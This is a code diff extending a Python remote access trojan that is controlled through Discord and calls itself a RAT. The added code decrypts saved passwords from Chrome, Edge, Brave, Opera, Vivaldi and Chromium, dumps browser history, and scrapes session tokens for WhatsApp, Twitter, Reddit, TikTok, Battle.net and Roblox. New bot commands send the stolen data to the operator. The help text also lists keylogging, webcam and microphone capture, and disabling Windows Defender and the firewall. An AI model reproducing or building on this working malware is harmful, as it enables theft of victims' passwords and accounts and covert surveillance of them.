@@ -33,6 +33,7 @@ import win32crypt
 from PIL import ImageGrab
 import certifi
 import ssl
+import tempfile
 
 # Fix SSL for PyInstaller bundled EXE
 if getattr(sys, 'frozen', False):
@@ -209,6 +210,124 @@ def get_wifipasswords():
         pass
     return profiles
 
+def get_browser_history(browser_name, history_db_path):
+    """Get browser history from Chromium-based browsers"""
+    history = []
+    try:
+        if not os.path.exists(history_db_path):
+            return []
+        
+        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_history.db")
+        shutil.copy2(history_db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+        
+        for url, title, timestamp in cursor.fetchall():
+            if title:
+                history.append(f"📄 {title}\n🔗 {url}\n")
+            else:
+                history.append(f"🔗 {url}\n")
+        
+        conn.close()
+        os.remove(temp_db)
+        return history
+    except:
+        return []
+
+def get_all_browser_history():
+    """Get history from all browsers"""
+    all_history = []
+    
+    browsers = {
+        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
+        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
+        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
+        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\History",
+        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History",
+        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data\Default\History"
+    }
+    
+    detected = []
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            detected.append(name)
+            history = get_browser_history(name, path)
+            if history:
+                all_history.append(f"**{name} History:**")
+                all_history.extend(history[:20])
+                all_history.append("-" * 40)
+    
+    return all_history, detected
+
+def get_browser_passwords(browser_name, user_data_path):
+    """Get passwords from Chromium-based browsers"""
+    passwords = []
+    try:
+        local_state_path = os.path.join(user_data_path, "Local State")
+        if not os.path.exists(local_state_path):
+            return []
+        
+        with open(local_state_path, 'r') as f:
+            local_state = json.load(f)
+        
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        
+        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
+        
+        for profile in profiles:
+            login_db = os.path.join(user_data_path, profile, "Login Data")
+            if not os.path.exists(login_db):
+                continue
+            
+            temp_db = os.environ['TEMP'] + f"\\{browser_name}_login.db"
+            shutil.copy2(login_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for url, username, encrypted_pass in cursor.fetchall():
+                if encrypted_pass:
+                    try:
+                        iv = encrypted_pass[3:15]
+                        payload = encrypted_pass[15:]
+                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                        decrypted = cipher.decrypt(payload)[:-16].decode()
+                        passwords.append(f"{browser_name} - {url}\nUser: {username}\nPass: {decrypted}\n{'-'*40}")
+                    except:
+                        pass
+            conn.close()
+            os.remove(temp_db)
+        
+        return passwords
+    except:
+        return []
+
+def get_all_browser_passwords():
+    """Get passwords from ALL browsers"""
+    all_passwords = []
+    detected = []
+    
+    browsers = {
+        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
+        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
+        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
+        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
+        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data"
+    }
+    
+    for name, path in browsers.items():
+        if os.path.exists(path):
+            detected.append(name)
+            passwords = get_browser_passwords(name, path)
+            all_passwords.extend(passwords)
+    
+    return all_passwords, detected
+
 def grab_all_tokens():
     """Grab tokens from Discord, Telegram, Steam, and other apps"""
     tokens = []
@@ -364,43 +483,102 @@ def grab_all_tokens():
                                     tokens.append(f"🏹 Riot Games: {match[:30]}...")
         except:
             pass
+
+    # WhatsApp
+    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
+    if os.path.exists(wa_path):
+        detected_apps.append("WhatsApp")
+        try:
+            for file in os.listdir(wa_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"token":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"💬 WhatsApp: {match[:30]}...")
+        except:
+            pass
+
+    # Twitter/X
+    twitter_paths = [
+        os.path.expanduser("~") + r"\AppData\Roaming\Twitter\Local Storage\leveldb",
+        os.path.expanduser("~") + r"\AppData\Local\Twitter\Local Storage\leveldb"
+    ]
+    for path in twitter_paths:
+        if os.path.exists(path):
+            detected_apps.append("Twitter")
+            try:
+                for file in os.listdir(path):
+                    if file.endswith((".log", ".ldb")):
+                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                            data = f.read()
+                            matches = re.findall(r'auth_token=[a-zA-Z0-9_-]+', data)
+                            for match in matches:
+                                tokens.append(f"🐦 Twitter: {match[:30]}...")
+            except:
+                pass
+
+    # Reddit
+    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
+    if os.path.exists(reddit_path):
+        detected_apps.append("Reddit")
+        try:
+            for file in os.listdir(reddit_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"access_token":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🔴 Reddit: {match[:30]}...")
+        except:
+            pass
+
+    # TikTok
+    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
+    if os.path.exists(tiktok_path):
+        detected_apps.append("TikTok")
+        try:
+            for file in os.listdir(tiktok_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🎵 TikTok: {match[:30]}...")
+        except:
+            pass
+
+    # Battle.net
+    battlenet_path = os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb"
+    if os.path.exists(battlenet_path):
+        detected_apps.append("Battle.net")
+        try:
+            for file in os.listdir(battlenet_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(battlenet_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"access_token":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🎮 Battle.net: {match[:30]}...")
+        except:
+            pass
+
+    # Roblox
+    roblox_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb"
+    if os.path.exists(roblox_path):
+        detected_apps.append("Roblox")
+        try:
+            for file in os.listdir(roblox_path):
+                if file.endswith((".log", ".ldb")):
+                    with open(os.path.join(roblox_path, file), 'r', errors='ignore') as f:
+                        data = f.read()
+                        matches = re.findall(r'"_|ROBLOSECURITY":"([^"]+)"', data)
+                        for match in matches:
+                            tokens.append(f"🧱 Roblox: {match[:30]}...")
+        except:
+            pass
     
     return tokens, list(set(detected_apps))
-
-def get_chrome_passwords():
-    if not CRYPTO_AVAILABLE:
-        return ["pycryptodome not installed"]
-    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
-    local_state_path = os.path.join(chrome_path, "Local State")
-    if not os.path.exists(local_state_path):
-        return ["Chrome not found"]
-    with open(local_state_path, 'r') as f:
-        local_state = json.load(f)
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    passwords = []
-    for profile in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
-        login_db = os.path.join(chrome_path, profile, "Login Data")
-        if not os.path.exists(login_db):
-            continue
-        temp_db = os.environ['TEMP'] + "\\chrome_login.db"
-        shutil.copy2(login_db, temp_db)
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for url, username, encrypted_pass in cursor.fetchall():
-            if encrypted_pass:
-                try:
-                    iv = encrypted_pass[3:15]
-                    payload = encrypted_pass[15:]
-                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                    decrypted = cipher.decrypt(payload)[:-16].decode()
-                    passwords.append(f"{url}\nUser: {username}\nPass: {decrypted}\n{'-'*40}")
-                except:
-                    pass
-        conn.close()
-        os.remove(temp_db)
-    return passwords if passwords else ["No passwords found"]
 
 def get_idle_time():
     class LASTINPUTINFO(ctypes.Structure):
@@ -1011,7 +1189,14 @@ async def run_cmd(ctx, *, command: str):
 @is_authorized()
 async def mic_record(ctx, duration: int = 10):
     if not AUDIO_AVAILABLE:
-        await send_embed(ctx, "Error", "PyAudio not installed - microphone unavailable", discord.Color.red())
+        await send_embed(ctx, "⚠️ PyAudio Not Installed", 
+            "Microphone recording requires PyAudio which is not bundled with this RAT.\n\n"
+            "**Try these alternatives:**\n"
+            "• `!camrec` - Record webcam video\n"
+            "• `!webcampic` - Take webcam photo\n"
+            "• `!voice` - Text-to-speech\n\n"
+            "PyAudio can be installed with: `pip install pyaudio`", 
+            discord.Color.orange())
         return
     try:
         if duration > 60:
@@ -1311,23 +1496,77 @@ async def grab_tokens(ctx):
 
 @bot.command(name='password')
 @is_authorized()
-async def chrome_passwords(ctx):
+async def all_browser_passwords(ctx):
+    """Dump passwords from ALL browsers (Chrome, Edge, Brave, Opera, Vivaldi, Chromium)"""
     if not CRYPTO_AVAILABLE:
         await send_embed(ctx, "Error", "pycryptodome not installed - password decryption unavailable", discord.Color.red())
         return
-    await send_embed(ctx, "Dumping", "Chrome passwords...", discord.Color.blue())
-    passwords = get_chrome_passwords()
-    if passwords and passwords != ["No passwords found"] and passwords != ["pycryptodome not installed"]:
-        output = "\n".join(passwords)
+    
+    await send_embed(ctx, "🔍 Dumping Passwords", "Checking all browsers...", discord.Color.blue())
+    
+    passwords, detected = get_all_browser_passwords()
+    
+    if passwords:
+        output = "\n".join(passwords[:30])
         if len(output) > 1900:
             with open("passwords.txt", "w", encoding='utf-8') as f:
-                f.write(output)
+                f.write("\n".join(passwords))
             await ctx.send(file=discord.File("passwords.txt"))
             os.remove("passwords.txt")
         else:
-            await send_embed(ctx, "🔑 Chrome Passwords", f"```{output[:1500]}```", discord.Color.green())
+            embed = discord.Embed(title="🔑 Browser Passwords", description=f"```{output}```", color=discord.Color.green())
+            embed.add_field(name="📊 Detected Browsers", value=", ".join(detected) if detected else "None", inline=False)
+            embed.add_field(name="📈 Total Passwords", value=str(len(passwords)), inline=True)
+            await ctx.send(embed=embed)
     else:
-        await send_embed(ctx, "Passwords", passwords[0] if passwords else "None found", discord.Color.red())
+        await send_embed(ctx, "Passwords", "No passwords found in any browser", discord.Color.red())
+
+@bot.command(name='webhistory')
+@is_authorized()
+async def browser_history(ctx):
+    """Get browser history from ALL browsers"""
+    await send_embed(ctx, "📜 Fetching Browser History", "Checking all browsers...", discord.Color.blue())
+    
+    history, detected = get_all_browser_history()
+    
+    if history:
+        output = "\n".join(history[:50])
+        if len(output) > 1900:
+            with open("history.txt", "w", encoding='utf-8') as f:
+                f.write("\n".join(history))
+            await ctx.send(file=discord.File("history.txt"))
+            os.remove("history.txt")
+        else:
+            embed = discord.Embed(title="📜 Browser History", description=output[:1900], color=discord.Color.blue())
+            embed.add_field(name="📊 Detected Browsers", value=", ".join(detected) if detected else "None", inline=False)
+            await ctx.send(embed=embed)
+    else:
+        await send_embed(ctx, "History", "No browser history found", discord.Color.red())
+
+@bot.command(name='sysinfo')
+@is_authorized()
+async def sysinfo_cmd(ctx):
+    await system_info(ctx)
+
+@bot.command(name='processes')
+@is_authorized()
+async def processes_cmd(ctx):
+    await list_process(ctx)
+
+@bot.command(name='apps')
+@is_authorized()
+async def apps_cmd(ctx, limit: int = 15):
+    await list_applications(ctx, limit)
+
+@bot.command(name='clip')
+@is_authorized()
+async def clip_cmd(ctx):
+    await get_clipboard(ctx)
+
+@bot.command(name='cam')
+@is_authorized()
+async def cam_cmd(ctx, duration: int = 10):
+    await cam_record(ctx, duration)
 
 @bot.command(name='idletime')
 @is_authorized()
@@ -1623,6 +1862,7 @@ async def help_cmd(ctx):
             "`open <app>` - Open application (notepad, calc, chrome, cmd)",
             "`close <app>` - Close application by name",
             "`listapps [limit]` - List running applications",
+            "`apps` - Alias for listapps",
             "`cmd <command>` - Run a CMD command on target",
             "`website <url>` - Open a website in browser"
         ],
@@ -1671,9 +1911,11 @@ async def help_cmd(ctx):
         "🎥 Surveillance": [
             "`webcampic` - Take webcam photo",
             "`camrec <seconds>` - Record webcam video (5-300s)",
-            "`mic <seconds>` - Record microphone (5-60s, requires PyAudio)",
+            "`cam` - Alias for camrec",
+            "`mic <seconds>` - Record microphone (5-60s)",
             "`screenshot` - Take screenshot",
             "`clipboard` - Get clipboard contents",
+            "`clip` - Alias for clipboard",
             "`keylog start/stop/dump` - Keylogger control",
             "`keylogstart` - Start keylogger",
             "`keylogstop` - Stop keylogger",
@@ -1682,8 +1924,9 @@ async def help_cmd(ctx):
             "`keylogstatus` - Check keylogger status"
         ],
         "🔐 Security & Stealing": [
-            "`grabtokens` - Grab tokens from: Discord, Telegram, Steam, Chrome, Epic Games, Minecraft, Spotify, GitHub, Riot Games",
-            "`password` - Dump Chrome saved passwords (requires pycryptodome)",
+            "`grabtokens` - Grab tokens from: Discord, Telegram, Steam, Chrome, Epic Games, Minecraft, Spotify, GitHub, Riot Games, WhatsApp, Twitter, Reddit, TikTok, Battle.net, Roblox",
+            "`password` - Dump saved passwords from ALL browsers (Chrome, Edge, Brave, Opera, Vivaldi, Chromium)",
+            "`webhistory` - Get browser history from ALL browsers",
             "`disabledefender` - Disable Windows Defender (admin)",
             "`disablefirewall` - Disable Windows Firewall (admin)",
             "`disabletaskmgr` - Disable Task Manager",
@@ -1691,6 +1934,7 @@ async def help_cmd(ctx):
         ],
         "⚙️ Process Management": [
             "`listprocess` - List all running processes with PID",
+            "`processes` - Alias for listprocess",
             "`prockill <name>` - Kill a process by name"
         ],
         "🔁 Persistence": [
@@ -1728,11 +1972,6 @@ async def startup_cmd(ctx, action: str = None):
             await send_embed(ctx, "Startup", "Not found", discord.Color.orange())
     else:
         await send_embed(ctx, "Usage", "!startup add/remove", discord.Color.orange())
-
-@bot.command(name='sysinfo')
-@is_authorized()
-async def sysinfo_cmd(ctx):
-    await system_info(ctx)
 
 @bot.command(name='dir')
 @is_authorized()
